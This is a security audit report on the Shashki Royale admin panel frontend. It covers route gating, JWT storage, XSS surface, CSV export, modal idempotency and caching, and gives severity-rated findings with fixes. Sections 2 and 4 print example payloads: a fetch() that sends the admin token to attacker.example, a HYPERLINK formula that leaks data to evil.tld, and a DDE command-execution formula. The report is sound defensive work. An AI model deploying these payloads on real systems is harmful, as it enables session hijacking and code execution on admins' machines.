# Shashki Royale · Admin Panel — Frontend / UX Audit

> Scope: route guards, XSS surface, CSV export, ActionModal flow,
> error rendering, sensitive data in devtools, accessibility.

---

## 1. Route protection

`src/App.tsx`:

```tsx
const [authed, setAuthed] = useState(() => !!getSession());
…
if (!authed) return <LoginScreen onSuccess={() => setAuthed(true)} />;
return <Layout><Routes>…</Routes></Layout>;
```

- All routes are *visually* gated behind a successful login.
- `getSession()` (`src/services/auth.ts:15-35`) only checks
  `exp` client-side — useful for UX, but server enforces auth on
  every `/api/admin/*` request.
- **`FIND-044`** (LOW): `useEffect` runs `getSession()` on every
  `location` change. If JWT expires mid-session, the user is bumped
  to login *only after* attempting the next nav — there's no
  proactive expiry handling. UX: silent failure cascade for a few
  seconds.

## 2. JWT in `localStorage`

(Already discussed as `FIND-006` in security audit.)

A successful XSS into the admin domain immediately:

1. Reads `sr_admin_token` and `sr_admin_email`.
2. Exfiltrates via `fetch('https://attacker.example/x', {body: localStorage.getItem('sr_admin_token')})`.
3. Attacker uses token until `exp` (8 hours default).

No CSP (`FIND-014`) means the exfiltration call isn't blocked.
No revocation list (`FIND-031`) means rotation of the token requires
rotating `JWT_SECRET`, which invalidates all sessions.

## 3. XSS surface (`dangerouslySetInnerHTML` / HTML from API)

`grep` for `dangerouslySetInnerHTML` across `src/`: **0 hits.** Good.

React text-renders by default. Vectors examined:

| Surface                                  | Vector                                | Verdict   |
| :--------------------------------------- | :------------------------------------ | :-------- |
| `LiveFeed.tsx` (player nicknames)         | API-supplied text                     | safe (text) |
| Player nicknames in `Players.tsx` table   | API-supplied text                     | safe (text) |
| `Toast.tsx` error/info messages           | rendered via children prop            | safe (text) |
| `LoginScreen.tsx` error                  | `err` string                          | safe (text) |
| Replay notation in `CheckersBoard.tsx`    | API-supplied move strings             | safe (text) |
| CSV export                               | nickname → raw string                 | **vulnerable (FIND-018)** |
| Command Palette                          | static commands                       | safe       |

## 4. CSV formula injection — `FIND-018` (MEDIUM) SUSPECTED

The `Players.tsx` page exposes a CSV export. The nickname field is
sourced from `public_profiles.nickname` (user-controlled at game-side
sign-up).

If a player's nickname begins with `=`, `+`, `-`, `@`, `\t`, or `\r`,
Microsoft Excel and LibreOffice will interpret the cell as a formula
when the admin opens the CSV. Payloads of concern:

- `=HYPERLINK("https://evil.tld/?q="&A1, "Click")` — sends row content
  to attacker.
- `=cmd|'/c calc.exe'!A1` — historic DDE attack vector.

**Defence**:

```ts
function sanitiseCsvCell(s: string | number | null | undefined): string {
  const raw = String(s ?? "");
  return /^[=+\-@\t\r]/.test(raw) ? `'${raw}` : raw;
}
```

Apply to *every* exported field whose source is user input
(nicknames, admin reasons, audit `note`, anything from
`wallet_transactions.note`).

We did not download the actual file to confirm because the export
would require an authenticated session. Marking SUSPECTED with high
confidence based on code structure.

## 5. `ActionModal.tsx` (Sprint 4)

Per static read of `src/components/ActionModal.tsx`:

- Provides a single confirm-modal pattern for grant/refund/suspend.
- Disables submit button while in flight (good — limits
  double-submit).
- Calls `apiMutate` once per submit.

**`FIND-045`** (LOW): No client-side `idempotency_key` reuse across
retries. The `grantCoin`/`refundStake`/`suspendPlayer` helpers
generate a *fresh* `crypto.randomUUID()` per call
(`src/services/auth.ts:209, 219, 231`). If the admin clicks
"Submit", network errors, and they retry, the second attempt has a
*different* idempotency key — and the server *cannot* deduplicate it.
This converts an idempotency safeguard into theatre. Fix: hoist
`idempotency_key` to component state on modal open, reuse across retries.

**`FIND-046`** (LOW): On success/failure, the modal returns to a
clean state. If a stale tab triggers a duplicate submit at the same
ms (double Enter), the disabled-flag race in React batched-state may
permit two fetches before disabled is reflected in DOM. Add a `useRef`
flag (`busy.current = true`) for hard guard.

## 6. Direct navigation / deep linking

- All `<Route>`s sit inside `<Layout>` which itself is inside
  `if (!authed)` gate.
- An unauthenticated browser hitting `/players/<uuid>` is rendered
  the LoginScreen first. ✅
- After login, the user lands on the requested route. ✅
- However, the API itself enforces auth, so the gate is purely UX.
  ✅

## 7. React Query caching

`src/main.tsx:9-13`:

```ts
const qc = new QueryClient({
  defaultOptions: {
    queries: { staleTime: 15_000, refetchOnWindowFocus: false, retry: 1 },
  },
});
```

- `staleTime: 15s` is reasonable for an admin dashboard.
- `retry: 1` is reasonable.
- `refetchOnWindowFocus: false` may surprise an admin who alt-tabs and
  expects fresh numbers. The "Sync" button in `Layout.tsx`
  (per handoff § 8.3) is the manual escape hatch — acceptable.

**`FIND-047`** (LOW): React Query state is *not* cleared on logout.
If an admin shares a device, the next user (post-login) may see
cached previous-user data for up to `staleTime`. Add `qc.clear()` on
`clearSession()`.

## 8. Accessibility (drive-by)

- `LoginScreen.tsx` uses appropriate `autoComplete` hints.
- All interactive elements (`<button>`, `<input>`) are native.
- No obvious missing `aria-` attributes; testid attributes exist on
  the login form (good for automation).

(Not deep-audited; not gating.)

## 9. Sensitive values in browser DevTools

| Field                              | Where                          | Sensitive? |
| :--------------------------------- | :----------------------------- | :--------- |
| JWT                                | `localStorage.sr_admin_token`  | Yes        |
| Email                              | `localStorage.sr_admin_email`  | Mildly     |
| Anon Supabase key                  | bundle (intended public)       | Public OK  |
| `VITE_ADMIN_PASSPHRASE`            | bundle (no longer used)        | Legacy     |
| TypeScript source                  | `/assets/*.js.map`             | EXPOSED (FIND-005) |

Recommendation:

- Disable source maps in production builds.
- Treat `localStorage` JWT as compromised; migrate to cookie-bound
  session per
  [`ADMIN_REMEDIATION_ROADMAP.md`](./ADMIN_REMEDIATION_ROADMAP.md).

## 10. Summary by severity

| Finding   | Severity | Status     |
| :-------- | :------: | :--------- |
| FIND-005  | CRITICAL | confirmed  |
| FIND-006  | HIGH     | confirmed  |
| FIND-014  | HIGH     | confirmed  |
| FIND-018  | MEDIUM   | suspected  |
| FIND-042  | MEDIUM   | confirmed  |
| FIND-044  | LOW      | confirmed  |
| FIND-045  | LOW      | confirmed  |
| FIND-046  | LOW      | confirmed  |
| FIND-047  | LOW      | confirmed  |
